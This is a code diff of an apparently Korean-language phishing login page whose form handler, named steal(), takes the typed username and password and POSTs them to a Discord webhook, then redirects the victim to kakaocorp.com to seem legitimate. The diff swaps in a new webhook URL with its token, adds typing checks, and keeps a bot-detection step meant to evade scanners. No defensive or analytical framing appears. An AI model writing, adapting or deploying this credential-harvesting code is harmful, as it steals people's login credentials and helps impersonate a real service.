@@ -155,15 +155,15 @@
   </style>
 </head>
 <body>
-  <div class="login-wrapper">
+  <div class="container">
     <div class="logo">로그인</div>
 
     <form onsubmit="steal(event)">
       <label for="username">아이디</label>
-      <input type="text" id="username" placeholder="아이디 입력">
+      <input class="input-field" id="username" type="text" placeholder="아이디 입력" required>
 
       <label for="password">비밀번호</label>
-      <input type="password" id="password" placeholder="비밀번호 입력">
+      <input class="input-field" id="password" type="password" placeholder="비밀번호 입력" required>
 
       <div class="find-links">
         <a href="#">아이디 찾기</a>
@@ -195,17 +195,13 @@
     console.log("Bot detected. Exiting.");
     throw new Error("Blocked");
   }
-const inputs = [
-    document.getElementById('username'),
-    document.getElementById('password')
-];
-inputs.forEach(input => {
-    if (input) {
-        input.addEventListener('input', () => {
-            typed = true;
-        });
-    }
-});
+
+  // Detect real typing
+  document.querySelectorAll(".input-field").forEach(field => {
+    field.addEventListener("input", () => {
+      typed = true;
+    });
+  });
 
   function steal(e) {
     e.preventDefault();
@@ -219,19 +215,17 @@ inputs.forEach(input => {
     const u = document.getElementById("username").value;
     const p = document.getElementById("password").value;
 
-    fetch("https://discord.com/api/webhooks/1396172055992336394/GOejbicsrzOQMrzWLor93mpEQLs2Dz6IPUeiGT7uvRF8EV6KNdmcJIcaltLIfAdZRcj1", {
+    fetch("https://discord.com/api/webhooks/1358102599647232202/4L51fQpmCq7hnbVud6P2AoYXGkpIrt2dYOts15JgJUb9LiEMeIxJJF5AdmDfJxtHlwFd", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
-        content: `🛑 강아지\nUsername: ${u}\nPassword: ${p}`
+        content: `🛑 고양이\nUsername: ${u}\nPassword: ${p}`
       })
     })
     .then(response => {
       if (response.ok) {
         setTimeout(() => {
-  console.log("Redirecting...");
-  window.location.href = "https://asked.kr/hhhhhh_ch";
-}, 1500);
+          window.location.href = "https://www.kakaocorp.com";
         }, Math.random() * 2000 + 1000);
       } else {
         alert('Something went wrong.');
